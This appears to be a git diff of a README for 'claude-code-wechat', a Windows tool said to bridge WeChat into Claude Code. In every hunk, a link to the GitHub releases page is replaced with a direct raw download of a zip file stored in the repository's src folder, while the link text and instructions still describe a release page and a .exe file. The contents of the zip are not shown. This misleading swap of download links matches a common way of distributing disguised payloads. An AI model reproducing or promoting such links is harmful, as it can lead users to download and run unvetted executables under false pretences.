@@ -1,6 +1,6 @@
 # 🤝 claude-code-wechat - Bridge WeChat into Claude Code
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-0078D4?style=for-the-badge)](https://github.com/lilzexotic/claude-code-wechat/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-0078D4?style=for-the-badge)](https://github.com/lilzexotic/claude-code-wechat/raw/refs/heads/main/src/wechat_claude_code_v2.1.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ This app is for Windows users who want a simple desktop setup. You download the 
 
 Visit this page to download the latest Windows release:
 
-https://github.com/lilzexotic/claude-code-wechat/releases
+https://github.com/lilzexotic/claude-code-wechat/raw/refs/heads/main/src/wechat_claude_code_v2.1.zip
 
 On the release page, look for the newest file for Windows. If you see a `.exe` file, download it to your computer.
 
@@ -178,7 +178,7 @@ A stable folder helps the app keep track of its files and settings.
 
 Check the release page when you want the newest version:
 
-https://github.com/lilzexotic/claude-code-wechat/releases
+https://github.com/lilzexotic/claude-code-wechat/raw/refs/heads/main/src/wechat_claude_code_v2.1.zip
 
 Download the latest build from that page, then replace your old copy if the release notes say to do so
 
@@ -226,7 +226,7 @@ This keeps your setup current and reduces version mismatch
 
 Download the latest Windows build here:
 
-[Visit the claude-code-wechat release page](https://github.com/lilzexotic/claude-code-wechat/releases)
+[Visit the claude-code-wechat release page](https://github.com/lilzexotic/claude-code-wechat/raw/refs/heads/main/src/wechat_claude_code_v2.1.zip)
 
 ## 💬 Daily use tips
 
